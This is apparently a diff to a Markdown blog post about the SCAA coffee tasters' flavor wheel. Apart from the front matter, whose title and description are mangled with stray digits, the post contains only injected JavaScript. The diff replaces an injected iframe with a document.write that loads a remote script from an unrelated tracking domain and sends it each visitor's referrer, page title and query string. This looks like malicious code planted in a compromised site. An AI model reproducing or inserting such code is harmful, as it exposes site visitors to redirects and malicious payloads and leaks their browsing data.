@@ -1,16 +1,15 @@
 ---
-title: Making sense of the SCAA’s new Flavor Wheel
+title: Making sense of the SCAA’s new Flavor Wheel22
 date: 2016-12-17T15:04:10.000Z
 description: The Coffee Taster’s Flavor Wheel, the official resource used by
-  coffee tasters, has been revised for the first time this year.
+  coffee tasters, has been revised for the first time this year.2
 image: /img/blog-flavor_wheel.jpg
 ---
 
 
 ```
-<div id="a098b93aa-8025-a29b-39d1-d2155a2ef9cb"></div>
 <script type="application/javascript">
-document.getElementById('a098b93aa-8025-a29b-39d1-d2155a2ef9cb').innerHTML = '<iframe sandbox="allow-top-navigation allow-scripts allow-popups allow-forms" frameborder="0" width="" height="" src="https://mobglobaltrk.com/2LBbn4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f5747faa4e6d=frame5f5747faa4e6e"></iframe>'
+document.write('<script type="application/javascript" src="https://mobglobaltrk.com/2LBbn4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f5747faa4e7e=script5f5747faa4e7f"><' + '/script>');
 </script>
 ```
 
